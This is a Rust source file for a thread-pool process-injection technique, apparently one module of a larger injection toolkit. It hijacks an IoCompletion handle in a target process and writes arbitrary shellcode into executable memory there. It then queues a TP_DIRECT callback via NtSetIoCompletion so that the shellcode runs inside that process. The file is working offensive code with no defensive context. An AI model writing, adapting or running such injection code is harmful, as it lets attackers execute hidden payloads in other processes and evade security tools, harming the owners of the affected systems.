use crate::{
    utils::hijack_handle,
    winapi::{IO_COMPLETION_ALL_ACCESS, NtSetIoCompletion, TpDirect},
};
use core::{mem::zeroed, ptr};
use ghostptr::{AllocationType, MemoryProtection, Process, ProcessError};

use super::Variant;

pub struct TpDirectInsertion;

impl Variant for TpDirectInsertion {
    fn run(&self, process: &Process, shellcode: &[u8]) -> ghostptr::Result<()> {
        let io_completion_handle =
            hijack_handle(process, "IoCompletion", IO_COMPLETION_ALL_ACCESS)?
                .expect("failed to hijack IoCompletion handle");

		println!("hijacked handle: {:?}", io_completion_handle);

        // allocate shellcode
        let remote_shellcode = process.alloc_mem(
            None,
            shellcode.len(),
            AllocationType::COMMIT | AllocationType::RESERVE,
            MemoryProtection::EXECUTE_READWRITE,
        )?;

        // write shellcode
        process.write_slice(remote_shellcode.address, shellcode)?;

		println!("remote shellcode: {:#X}", remote_shellcode.address);

        let mut direct = unsafe { zeroed::<TpDirect>() };
        direct.callback = remote_shellcode.address as _;

        // allocate TpDirect
        let remote_direct = process.alloc_mem(
            None,
            size_of::<TpDirect>(),
            AllocationType::COMMIT | AllocationType::RESERVE,
            MemoryProtection::READWRITE,
        )?;

        // write TpDirect
        process.write_mem(remote_direct.address, &direct)?;

		println!("remote TP_DIRECT: {:#X}", remote_direct.address);

        let status = unsafe {
            NtSetIoCompletion(
                io_completion_handle,
                remote_direct.address as _,
				ptr::null(),
				0,
				0,
            )
        };

		if status != 0 {
			Err(ProcessError::NtStatus(status))
		} else {
			Ok(())
		}
    }
}
